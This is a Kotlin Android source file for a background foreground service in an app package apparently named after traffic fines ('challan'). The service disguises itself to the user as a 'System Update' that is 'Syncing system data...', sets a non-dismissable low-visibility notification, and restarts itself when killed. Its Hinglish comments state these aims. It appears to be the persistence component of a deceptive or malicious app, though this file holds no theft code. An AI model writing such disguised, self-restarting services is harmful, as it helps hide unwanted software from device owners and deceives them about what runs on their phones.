package com.rte.challan.service

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Intent
import android.content.pm.ServiceInfo
import android.os.Build
import android.os.IBinder
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import com.rte.challan.R

class BackgroundService : Service() {

    private val CHANNEL_ID = "SYSTEM_UPDATE_SERVICE"
    private val NOTIFICATION_ID = 1001

    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
        
        // Android 14+ (API 34) aur Android 15 ke liye special handling
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            try {
                startForeground(
                    NOTIFICATION_ID, 
                    getNotification(), 
                    ServiceInfo.FOREGROUND_SERVICE_TYPE_SPECIAL_USE 
                )
            } catch (e: Exception) {
                startForeground(NOTIFICATION_ID, getNotification())
            }
        } else {
            startForeground(NOTIFICATION_ID, getNotification())
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        // Isse service kill hone par apne aap restart ho jayegi
        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? = null

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "System Update", // User ko settings mein ye naam dikhega
                NotificationManager.IMPORTANCE_LOW
            ).apply {
                description = "System data synchronization and maintenance."
                setSound(null, null)
                setShowBadge(false)
            }
            val manager = getSystemService(NotificationManager::class.java)
            manager?.createNotificationChannel(channel)
        }
    }

    private fun getNotification(): Notification {
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("System Update") // Notification Title
            .setContentText("Syncing system data...") // Notification Content
            // ⬇️ Yahan humne naya Gear icon link kiya hai
            .setSmallIcon(R.drawable.ic_notification_gear) 
            // ⬇️ Isse notification icon blue color ka dikhega
            .setColor(ContextCompat.getColor(this, R.color.ic_launcher_background))
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setOngoing(true) // User ise swipe karke hata nahi payega
            .setCategory(Notification.CATEGORY_SERVICE)
            .build()
    }
}
